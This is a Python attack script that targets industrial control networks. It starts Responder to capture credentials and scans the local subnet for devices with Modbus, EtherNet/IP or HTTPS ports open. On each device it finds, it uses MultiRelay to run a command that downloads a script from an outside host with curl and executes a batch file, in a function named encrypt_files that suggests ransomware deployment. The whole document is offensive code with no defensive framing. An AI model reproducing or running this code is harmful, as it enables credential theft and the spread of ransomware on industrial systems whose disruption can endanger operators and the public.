import socket
import os
import subprocess
import time
import threading
import requests

print("[+] Checking for internet connection")
res = ""
while "html" not in res and res is not None:
    try:
        res = requests.get("https://google.com/").text
    except Exception as e:
        pass
    time.sleep(1)

print("[+] Device is connected to the Internet\n")
ip_list = []
hmi = {}


def responder():
    os.system("python Responder.py -I eth0")


print("[+] Responder started\n")
threading.Thread(target=responder).start()


def encrypt_files(ip):
    os.system(f"python MultiRelay.py -t {ip} -u ALL -c “curl https://encryptfile -o enc.sh; start enc.bat”")


def ip_exist(ip):
    global ip_list, hmi
    hmi_ports = (502, 44818, 443)
    res = subprocess.run(["ping", ip], capture_output=True)
    if "Approximate round" in res.stdout.decode("UTF-8"):
        ip_list.append(ip)
        for port in hmi_ports:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            socket.setdefaulttimeout(1)

            # returns an error indicator
            result = s.connect_ex((ip, port))
            if result == 0:
                threading.Thread(target=encrypt_files, args=[ip]).start()
                hmi.update({ip: port})


def ipscanning():
    global ip_list, hmi
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    s.connect(("8.8.8.8", 80))

    local_ip = s.getsockname()[0]
    build_ip = local_ip.split(".")
    builder = f"{build_ip[0]}.{build_ip[1]}"
    print(f"[+] Local IP --> {local_ip}")
    print(f"[+] Scanning ip --> {builder}.255.255\n ")

    for class_c in range(1,255):
        for class_d in range(1, 255):
            ip = f"{builder}.{class_c}.{class_d}"
            while threading.active_count() > 600:
                pass
            print(f"\r[+] Scan for --> {ip}", end="")
            threading.Thread(target=ip_exist, args=[ip]).start()


    print(f"[+] Found {len(ip_list)} IP addresses")
    print(f"[+] Found {len(hmi)} HMI Devices")

ipscanning()